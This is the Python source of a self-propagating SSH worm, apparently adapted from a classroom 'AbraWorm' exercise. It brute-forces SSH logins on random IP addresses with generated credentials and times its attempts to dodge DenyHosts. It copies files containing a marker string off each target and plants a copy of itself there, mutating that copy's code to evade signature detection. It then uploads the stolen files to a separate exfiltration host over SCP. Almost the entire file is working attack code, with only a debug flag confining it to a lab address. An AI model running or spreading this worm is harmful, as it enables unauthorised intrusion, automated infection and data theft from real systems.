
import re
import sys
import os
import random
import paramiko
import scp
import select
import signal



def sig_handler(signum, frame): os.kill(os.getpid(), signal.SIGKILL)


signal.signal(signal.SIGINT, sig_handler)

debug = 1     
NHOSTS = NUSERNAMES = NPASSWDS = 3


trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams = digrams.split()


def get_new_usernames(how_many):
    if debug:
        return ['root']      # need a working username for debugging
    if how_many == 0:
        return 0
    selector = "{0:03b}".format(random.randint(0, 7))
    usernames = [''.join(map(lambda x: random.sample(trigrams, 1)[0]
                             if int(selector[x]) == 1 else random.sample(digrams, 1)[0], range(3))) for x in range(how_many)]
    return usernames


def get_new_passwds(how_many):
    if debug:
        return ['mypassword']      # need a working username for debugging
    if how_many == 0:
        return 0
    selector = "{0:03b}".format(random.randint(0, 7))
    passwds = [''.join(map(lambda x:  random.sample(trigrams, 1)[0] + (str(random.randint(0, 9))
                                                                       if random.random() > 0.5 else '') if int(selector[x]) == 1
                           else random.sample(digrams, 1)[0], range(3))) for x in range(how_many)]
    return passwds


def get_fresh_ipaddresses(how_many):
    if debug:
        return ['172.17.0.3']
    if how_many == 0:
        return 0
    ipaddresses = []
    for i in range(how_many):
        first, second, third, fourth = map(lambda x: str(
            1 + random.randint(0, x)), [223, 223, 223, 223])
        ipaddresses.append(first + '.' + second + '.' + third + '.' + fourth)
    return ipaddresses


# For the same IP address, we do not want to loop through multiple user
# names and passwords consecutively since we do not want to be quarantined
# by a tool like DenyHosts at the other end.  So let's reverse the order
# of looping.


def add_random_newlines(code, num_newlines=3):
    lines = code.split('\n')
    # Avoid adding newlines at the beginning and end
    indices = random.sample(range(1, len(lines) - 1), num_newlines)
    for idx in sorted(indices, reverse=True):
        lines.insert(idx, '')
    return '\n'.join(lines)


def modify_control_statement(statement):
    ridiculous_conditions = [
        "True and False",
        "2 + 2 == 5",
        "len('hello') != 5",
        "'openai'.startswith('closed')",
        "1 > 10",
        "'spam' not in ['ham', 'eggs']"
    ]

    return statement + random.choice(ridiculous_conditions)


def add_random_characters(comment, num_characters=15):

    characters = "!@#$%^&*()_+-=[]{}|;:',.<>?/"
    for _ in range(num_characters):
        index = random.randint(1, len(comment) - 1)
        char = random.choice(characters)
        comment = comment[:index] + char + comment[index:]
    comment = '#' + comment
    return comment


def add_random_whitespace(identifier, num_spaces=5):
    # Find all word boundaries in the identifier

    if not identifier:
        return identifier
    if identifier == '':
        return identifier
    # if identifier contains the word root or password, don't add whitespace
    if 'root' in identifier or 'password' in identifier:
        return identifier
    # if identifier contains a number or a special character, don't add whitespace
    if any(char.isdigit() for char in identifier) or not any(char.isalpha() for char in identifier):
        return identifier

    # do not add whitespace inside a bracket
    if '(' in identifier or ')' in identifier:
        return identifier
    if '[' in identifier or ']' in identifier:
        return identifier
    if '{' in identifier or '}' in identifier:
        return identifier
    # do not add whitespace inside a string literal
    if "'" in identifier or '"' in identifier:
        return identifier

    word_boundaries = [m.start() for m in re.finditer(r'\b', identifier)]
    whitespace_indices = [i for i in range(
        len(identifier)) if identifier[i].isspace()]

    # Combine word boundaries and existing whitespace indices to ensure we don't break indentation
    valid_indices = sorted(set(word_boundaries) | set(whitespace_indices))

    # Filter valid indices to avoid adding whitespace at the beginning of a line
    valid_indices = [index for index in valid_indices if index >
                     0 and not identifier[index-1].isspace()]

    # Add random whitespace at valid indices
    for _ in range(num_spaces):
        index = random.choice(valid_indices)
        identifier = identifier[:index] + ' ' + identifier[index:]
        # Update valid indices to consider the newly added whitespace
        valid_indices = [i if i < index else i + 1 for i in valid_indices]

    return identifier


def modify_python_code(code):
    lines = code.split('\n')
    modified_lines = []
    for i in range(len(lines)):
        # skip the empty lines
        modified_lines.append(lines[i])
        if lines[i] == '':
            continue
        line = lines[i].strip()
        if line.startswith('#'):  # Random changes only in comments
            # Add random characters to comments
            modified_lines[i] = add_random_characters(lines[i])

            # Add random whitespace to comments
        try:
            modified_lines[i] = add_random_whitespace(
                modified_lines[i])  # Add random whitespace
        except Exception as e:
            print('')
    modified_code = '\n'.join(modified_lines)

    modified_code = add_random_newlines(modified_code)  # Add random newlines

    # Modify a control statement if any
    if 'if' in modified_code or 'while' in modified_code or 'for' in modified_code:
        modified_code = modify_control_statement(modified_code)

    return modified_code


def read_remote_file(ssh_client, file_path):
    with ssh_client.open_sftp() as sftp:
        with sftp.file(file_path, "r") as remote_file:
            return remote_file.read().decode()


while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds = get_new_passwds(NPASSWDS)
#    print("usernames: %s" % str(usernames))
#    print("passwords: %s" % str(passwds))
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" %
                      (passwd, user, ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address, port=22, username=user,
                                password=passwd, timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously
                    # infected:
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        print(error)
                    received_list = list(
                        map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" %
                          str(received_list))
                    # if ''.join(received_list).find('AbraWorm') >= 0:
                    #     print("\nThe target machine is already infected\n")
                    #     continue
                    # Now let's look for files that contain the string 'abracadabra'
                    cmd = 'grep -ls abracadabra *'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()
                    if error:
                        print(error)
                        continue
                    received_list = list(
                        map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" %
                          str(files_of_interest_at_target))
                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                    # Now deposit a copy of AbraWorm.py at the target host:

                    script_filename = os.path.abspath(sys.argv[0])
                    # print("script_filename: ", script_filename)
                    # with open(script_filename, 'r') as file:
                    #     script_content = file.read()

                    # modified_content = modify_python_code(script_content)

                    # print(modified_content)

                    # # with open(script_filename, 'w') as file:
                    # #     file.write(modified_content)
                    scpcon.put(sys.argv[0])

                    content = read_remote_file(ssh, sys.argv[0])

                    content = modify_python_code(content)

                   # content = modify_python_code(content)  # modify the code
                   # print(content)

                   # clear the contents of the file and write the modified code

                    with ssh.open_sftp() as sftp:
                        with sftp.file(sys.argv[0], "w") as remote_file:
                            remote_file.write(content.encode())

                    scpcon.close()
                except Exception as e:

                    print(e)
                    print("exception caught")
                    continue
                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(
                            paramiko.AutoAddPolicy())
                        #  For exfiltration demo to work, you must provide an IP address and the login
                        #  credentials in the next statement:
                        ssh.connect('172.17.0.2', port=22,
                                    username='yyyy', password='yyyyyyy', timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exhiltration host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except:
                        print("No uploading of exfiltrated files\n")
                        continue
    if debug:
        break
